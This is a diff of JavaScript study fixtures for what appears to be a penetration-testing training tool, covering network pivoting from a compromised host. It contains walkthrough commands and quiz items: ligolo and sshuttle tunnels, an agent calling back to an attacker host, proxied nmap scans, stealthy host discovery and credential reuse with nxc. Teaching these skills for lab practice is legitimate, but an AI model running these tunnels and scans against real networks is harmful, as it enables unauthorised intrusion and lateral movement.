+      {"t":"Point proxychains at it","d":"Set socks5 127.0.0.1 1080 in proxychains.conf, then wrap any tool to route through the tunnel.","demo":[{"run":"tail -1 /etc/proxychains4.conf","out":"socks5 127.0.0.1 1080","sig":"socks5 127.0.0.1 1080"}],"note":"Now proxychains nmap or crackmapexec reach 172.16.5.0/24 through the foothold."}]},
+    "pivot-ligolo": {"lead":"ligolo spans both machines: create the tun and start the proxy on your box, run the agent on the target, then add the route.","items":[
+      {"t":"Create the tun and start the proxy (your box)","d":"Make a tun interface named ligolo, bring it up, then start the proxy with a self-signed cert.","demo":[{"run":"sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert","out":"INFO[0000] Listening on 0.0.0.0:11601\nINFO[0000] Waiting for agent...","sig":"Listening on 0.0.0.0:11601"}],"note":"The proxy waits for the agent on 11601."},
+      {"t":"Run the agent (on the target)","d":"The agent connects back to your proxy; -ignore-cert accepts the self-signed cert.","demo":[{"run":"./agent -connect <LHOST>:11601 -ignore-cert","out":"INFO[0000] Connection established    addr=<LHOST>:11601","sig":"Connection established"}],"note":"In the proxy console a new session appears; select it with `session` and start it."},
+      {"t":"Add the route (your box)","d":"Once the session is started, add a host-side route so your box sends that subnet through the tunnel.","demo":[{"run":"sudo ip route add 172.16.5.0/24 dev ligolo && ip route | grep ligolo","out":"172.16.5.0/24 dev ligolo scope link","sig":"172.16.5.0/24 dev ligolo"}],"note":"Your box now routes that subnet through the tunnel; tools hit it natively, no proxychains."}]},
+    "pivot-sshuttle": {"lead":"sshuttle runs entirely from your box over the SSH session; one command carries the subnet.","items":[
+      {"t":"Carry a subnet over SSH","d":"sshuttle -r user@host SUBNET builds the transparent route; add --dns to send internal lookups through too.","demo":[{"run":"sshuttle -r bob@10.10.10.10 172.16.5.0/24","out":"c : Connected to server.","sig":"Connected to server."}],"note":"Traffic to 172.16.5.0/24 now routes over SSH, with no proxychains wrapper."},
+      {"t":"Use a key instead of a password","d":"Point sshuttle at a key with --ssh-cmd when password auth is off.","demo":[{"run":"sshuttle --ssh-cmd 'ssh -i id_rsa' -r bob@10.10.10.10 172.16.5.0/24","out":"c : Connected to server.","sig":"Connected to server."}],"note":"Same transparent route, authenticated by the key."},
+      {"t":"Confirm the route works","d":"Hit the internal host directly, with no wrapper; sshuttle intercepts and tunnels it.","demo":[{"run":"nmap -sT -Pn 172.16.5.20","out":"Nmap scan report for 172.16.5.20\n445/tcp open  microsoft-ds","sig":"445/tcp open"}],"note":"A direct nmap now reaches the internal host because sshuttle routes it transparently."}]},
+    "pivot-ssh-dynamic": {"lead":"ssh -D opens a SOCKS proxy; proxychains carries your tools through it.","items":[
+      {"t":"Open the dynamic forward","d":"ssh -fND 1080 opens a backgrounded SOCKS proxy on 1080 and runs no remote command, just the tunnel.","demo":[{"run":"ssh -fND 1080 bob@10.10.10.10 && ss -tlnp | grep 1080","out":"LISTEN 0  128  127.0.0.1:1080  0.0.0.0:*","sig":"127.0.0.1:1080"}],"note":"-f backgrounds it; the listening socket on 1080 confirms the proxy is up."},
+      {"t":"Point proxychains at 1080","d":"Set socks5 127.0.0.1 1080 in proxychains.conf so tools route through the SSH tunnel.","demo":[{"run":"tail -1 /etc/proxychains4.conf","out":"socks5 127.0.0.1 1080","sig":"socks5 127.0.0.1 1080"}],"note":"Any proxychains-wrapped tool now exits via the foothold."},
+      {"t":"Reach the internal host","d":"Wrap a connect scan in proxychains to enumerate through the tunnel.","demo":[{"run":"proxychains -q nmap -sT -Pn 172.16.5.20","out":"Nmap scan report for 172.16.5.20\n445/tcp open  microsoft-ds","sig":"445/tcp open"}],"note":"Enumeration restarts one network deeper, through a single SSH flag."}]},
+    "pivot-scan-through": {"lead":"Through a proxy, force TCP connect (-sT) and skip discovery (-Pn), then enumerate the internal host as if starting over.","items":[
+      {"t":"Connect-scan the host","d":"-sT does a full TCP handshake (the only kind that survives SOCKS); -Pn skips the ping that a proxy drops.","demo":[{"run":"proxychains -q nmap -sT -Pn -n 172.16.5.20","out":"Nmap scan report for 172.16.5.20\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server","sig":"445/tcp  open"}],"note":"A Windows host one network deeper; enumerate its services next."},
+      {"t":"Scope the ports to stay fast","d":"Proxied scans are slow, so target the ports you care about rather than all 65535.","demo":[{"run":"proxychains -q nmap -sT -Pn -p 445,3389,5985 172.16.5.20","out":"445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n5985/tcp open  wsman","sig":"5985/tcp open"}],"note":"5985 open means WinRM; a working credential could land you a shell on this internal box."},
+      {"t":"Pivot your other tools too","d":"Anything that speaks TCP works through proxychains: crackmapexec, impacket, a browser.","demo":[{"run":"proxychains -q nxc smb 172.16.5.20 -u bob -p 'Autumn2026!'","out":"SMB  172.16.5.20  445  FILE01  [+] corp.local\\bob","sig":"corp.local\\bob"}],"note":"The same creds from the foothold often work on the internal host; keep reusing them."}]}
+  };
+  Object.keys(PIVOT_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = PIVOT_HOW[k]; });
+
+  var PIVOT_PRACTICE = {
+    "local-linux-interfaces": {situation:"You just landed a shell on a Linux box and want to know if a pivot is even possible. What is the first thing to check?", choices:["local-linux-interfaces","local-linux-routes","pivot-chisel-socks","pivot-scan-through"], coach:{"local-linux-routes":"A strong complementary check, but the interface list is the quickest proof of a second, internal-facing NIC.","pivot-chisel-socks":"That is the tunnel you build once you have confirmed an internal segment exists; check the interfaces first.","pivot-scan-through":"Too early, you have no tunnel yet; first confirm the box can even see another network."}},
+    "local-linux-routes": {situation:"You are on a Linux foothold and want to know which internal networks this box can reach, including any via a gateway, before building a tunnel. What do you read?", choices:["local-linux-routes","local-linux-interfaces","local-linux-neighbors","pivot-sshuttle"], coach:{"local-linux-interfaces":"Interfaces show the box's own addresses; the routing table additionally shows networks it reaches through a gateway.","local-linux-neighbors":"The ARP cache lists individual hosts, not whole subnets; routes name the networks to aim a tunnel at.","pivot-sshuttle":"That is the tunnel you build after you know the subnet; routes are how you learn the subnet first."}},
+    "local-linux-neighbors": {situation:"You want a short list of internal hosts that are definitely alive, without scanning and tipping off a defender. What do you read on the foothold?", choices:["local-linux-neighbors","local-linux-routes","pivot-scan-through","local-linux-interfaces"], coach:{"local-linux-routes":"Routes give subnets, not individual live hosts; the ARP cache names machines that actually answered.","pivot-scan-through":"That sends packets and needs a tunnel first; the ARP cache gives live hosts for free, no scan.","local-linux-interfaces":"Interfaces show this box's own NICs; the neighbour cache shows the other machines it has talked to."}},
+    "local-linux-dns": {situation:"You want to map internal hostnames and find the domain controller without sweeping IPs. What on the Linux foothold points you there?", choices:["local-linux-dns","local-linux-neighbors","local-linux-routes","pivot-ligolo"], coach:{"local-linux-neighbors":"That lists live IPs, not names or infrastructure; resolv.conf names the DNS server that knows the whole estate.","local-linux-routes":"Routes give subnets; the resolver gives you the internal DNS, which maps names to hosts.","pivot-ligolo":"That is the tunnel you build afterward; first read the resolver to know what to look for."}},
+    "local-windows-interfaces": {situation:"You have a WinRM foothold on a server and want to know if it bridges into the internal network. What do you check first?", choices:["local-windows-interfaces","local-windows-routes","local-windows-listeners","pivot-chisel-socks"], coach:{"local-windows-routes":"A good follow-up, but the interface list is the quickest proof of a second, internal-facing NIC.","local-windows-listeners":"That shows local services, not networks; interfaces tell you whether a pivot is even possible.","pivot-chisel-socks":"That is the tunnel you build once you have confirmed an internal segment; check the interfaces first."}},
+    "local-windows-routes": {situation:"On a Windows foothold you want the exact internal subnets this box can reach before tunnelling. What do you read?", choices:["local-windows-routes","local-windows-interfaces","local-windows-neighbors","pivot-ssh-dynamic"], coach:{"local-windows-interfaces":"Interfaces show the box's own addresses; the route table adds networks it reaches through a gateway.","local-windows-neighbors":"The ARP cache lists individual hosts, not subnets; routes name the networks to aim at.","pivot-ssh-dynamic":"That needs SSH, which Windows rarely offers, and it is the tunnel step, after you know the subnet."}},
+    "local-windows-neighbors": {situation:"You want a no-scan list of live internal hosts from a Windows foothold, to avoid tipping off monitoring. What do you read?", choices:["local-windows-neighbors","local-windows-listeners","local-windows-routes","pivot-scan-through"], coach:{"local-windows-listeners":"That shows services on this box, not other live hosts; the ARP cache names the neighbours.","local-windows-routes":"Routes give subnets, not individual confirmed-live hosts; the ARP cache gives the latter for free.","pivot-scan-through":"That sends packets and needs a tunnel; the ARP cache lists live hosts without a single scan packet."}},
+    "local-windows-listeners": {situation:"On a Windows foothold, netstat shows MSSQL listening on 127.0.0.1:1433 and you cannot reach it from the network. What does that tell you to set up?", choices:["local-windows-listeners","pivot-scan-through","local-windows-routes","pivot-sshuttle"], coach:{"pivot-scan-through":"A network scan will never see a loopback-only service; the listener read revealed it, and a port-forward is how you reach it.","local-windows-routes":"Routes are about networks, not a service bound to localhost on this very box; the listener view is the relevant one.","pivot-sshuttle":"That tunnels a whole subnet and needs SSH; a loopback service needs a local port-forward, which the listener view told you to build."}},
+    "pivot-chisel-socks": {situation:"The foothold routes to 172.16.5.0/24 but cannot accept inbound connections (firewalled), and it has no SSH. You need your Kali tools on that segment. Which pivot fits?", choices:["pivot-chisel-socks","pivot-ssh-dynamic","pivot-scan-through","local-linux-routes"], coach:{"pivot-ssh-dynamic":"That needs SSH on the foothold; here there is none, and a reverse chisel works even when the box cannot accept inbound.","pivot-scan-through":"That is what you do after the tunnel is up; first you need the tunnel.","local-linux-routes":"Already done, that is how you learned about 172.16.5.0/24; now carry your tools there."}},
+    "pivot-ligolo": {situation:"You have an internal subnet in range and want to run SYN scans and tools that break under a SOCKS proxy, with no proxychains wrapping. Which pivot?", choices:["pivot-ligolo","pivot-chisel-socks","pivot-sshuttle","pivot-scan-through"], coach:{"pivot-chisel-socks":"That gives a SOCKS proxy, so you still wrap tools in proxychains and lose SYN scans; ligolo's tun interface avoids both.","pivot-sshuttle":"That needs SSH creds on the foothold; ligolo works from just an uploaded agent and also gives a native interface.","pivot-scan-through":"That is the scan you run after the tunnel, and it assumes a SOCKS proxy with -sT; ligolo lets you skip that constraint."}},
+    "pivot-sshuttle": {situation:"The pivot host is Linux, you hold bob's SSH password, and it routes to 172.16.5.0/24. You want the least-friction tunnel with nothing uploaded. Which pivot?", choices:["pivot-sshuttle","pivot-chisel-socks","pivot-ligolo","pivot-ssh-dynamic"], coach:{"pivot-chisel-socks":"That uploads an agent and gives a SOCKS proxy you must wrap; with SSH creds sshuttle is lower-friction and transparent.","pivot-ligolo":"Also uploads an agent; sshuttle needs nothing on the target when you already have SSH.","pivot-ssh-dynamic":"Close, and also SSH-only, but it gives a SOCKS proxy you wrap in proxychains; sshuttle is transparent, no wrapper."}},
+    "pivot-ssh-dynamic": {situation:"You hold SSH creds on the foothold and want a SOCKS proxy for proxychains and your browser, without uploading anything. Which pivot?", choices:["pivot-ssh-dynamic","pivot-sshuttle","pivot-chisel-socks","pivot-ligolo"], coach:{"pivot-sshuttle":"That is transparent with no SOCKS endpoint; if you specifically want a SOCKS proxy for proxychains or a browser, ssh -D is the direct fit.","pivot-chisel-socks":"That uploads an agent; with SSH creds you get a SOCKS proxy from one ssh flag, nothing to drop.","pivot-ligolo":"Also an uploaded agent and a tun interface, overkill when one SSH flag gives the SOCKS proxy you want."}},
+    "pivot-scan-through": {situation:"A SOCKS tunnel to 172.16.5.0/24 is up, but a normal nmap 172.16.5.20 just hangs. What is wrong?", choices:["pivot-scan-through","pivot-chisel-socks","local-linux-routes","pivot-ligolo"], coach:{"pivot-chisel-socks":"The tunnel is already built; the hang is a scan-flags problem, not a tunnel problem.","local-linux-routes":"Routes are how you found the subnet; the hang is nmap defaulting to a SYN scan and a ping that a SOCKS proxy drops.","pivot-ligolo":"Switching tunnels would not help; with a SOCKS proxy you must use -sT -Pn, which is the actual fix."}}
+  };
+  Object.keys(PIVOT_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = PIVOT_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });
 
 })(typeof globalThis !== 'undefined' ? globalThis : this);
